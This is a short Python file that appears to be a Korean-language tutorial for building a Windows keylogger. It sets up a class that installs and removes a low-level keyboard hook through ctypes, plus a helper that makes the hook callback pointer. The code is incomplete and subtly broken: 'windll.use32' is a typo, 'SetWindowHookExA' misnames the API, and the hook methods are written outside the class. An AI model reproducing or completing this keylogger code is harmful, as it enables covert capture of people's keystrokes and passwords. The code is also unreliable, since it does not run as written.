import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

#ctype란 뭘까요? 윈도우, 리눅스, 유닉스, OS X, 안드로이드 등 다양한 플랫폼을 지원하는 맥가이버 칼과 같은 도구!!

user32 = windll.use32
kernel32 = windll.kernel32
#windll을 사용해서 user32와 kernel32형 변수를 선언했습니다. 

WH_KEYBOARD_LL=13
WM_KEYDOWN=0X0100
CTRL_CODE =162
#변수 선언 Win32 API 내부에서 정의해서 사용하는 변숫값

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
# 훅을 설정하고 해제하는 기능을 가진 클래스를 정의 

def installHookProc(self, pointer):
    self.hooked = self.lUser32.SetWindowHookExA(
        WH_KEYBOARD_LL,
        pointer,
        kernel32.GetModuleHandleW(None),
        0)
    if not self.hooked:
        return False
    return True

# 훅 설정 함수 정의 : 훅을 설정함, 모니터링 이벤트는 키보드에 입력이며, 스레드로 설정

def uninstallHookProc(self):
    if self.hooked is None:
        return
    self.lUser32.UnhookWindowsHookEx(self.hooked)
    self.hooked = None

#훅 해제 함수 정의 : 시스템 부하에 영향을 미치기 때문에 반드시 해제가 필요함 

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

# 함수 포인터 도출 : 훅 프로시저를 등록하려면 함수의 포인터를 전달해야함 